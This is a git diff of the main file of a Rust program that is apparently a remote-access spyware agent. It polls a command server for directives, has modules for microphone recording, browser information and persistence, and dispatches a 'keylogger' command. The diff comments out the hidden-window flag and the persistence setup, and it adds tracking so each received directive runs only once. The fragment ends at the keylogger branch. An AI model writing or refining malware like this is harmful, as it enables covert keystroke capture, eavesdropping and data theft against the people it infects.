@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 mod connexion;
 mod input;
 mod logs;
@@ -10,6 +10,7 @@ use tokio::task::JoinHandle;
 mod browser_info;
 mod mic_rec;
 mod persistance;
+use std::collections::HashSet;
 
 fn setup_persistence() {
     #[cfg(target_os = "windows")]
@@ -25,9 +26,10 @@ fn setup_persistence() {
 
 #[tokio::main]
 async fn main() {
-    setup_persistence();
+    // setup_persistence();
 
     let mut active_tasks: Vec<JoinHandle<()>> = Vec::new();
+    let mut executed_directives: HashSet<String> = HashSet::new();
 
     loop {
         match connexion::get_directives().await {
@@ -35,6 +37,12 @@ async fn main() {
                 println!("Commands received: {:?}", commands);
 
                 for command in commands {
+                    if executed_directives.contains(&command) {
+                        continue;
+                    }
+
+                    executed_directives.insert(command.clone());
+
                     let handle = match command.as_str() {
                         "keylogger" => tokio::spawn(async {
                             println!("Démarrage du keylogger...");
